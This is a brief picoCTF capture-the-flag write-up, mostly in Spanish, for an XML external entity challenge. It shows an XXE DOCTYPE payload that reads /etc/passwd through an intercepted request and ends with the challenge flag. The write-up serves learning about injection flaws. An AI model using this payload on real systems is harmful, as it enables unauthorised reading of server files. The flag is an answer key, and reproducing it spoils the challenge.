The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.

Hints:
- XML external entity Injection

## Solución
Hay que usar un proxy e interceptar la petición al solicitar más información de cualquier universidad.
En la parte del xml, hay que ingresar el siguiente payload:
```
<!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
```
Y colocar `&xxe;` dentro del tag `ID` de la etiqueta de data.
Hay muchos más payloads, esto es `Inyección XML` o `XXE`

`picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}`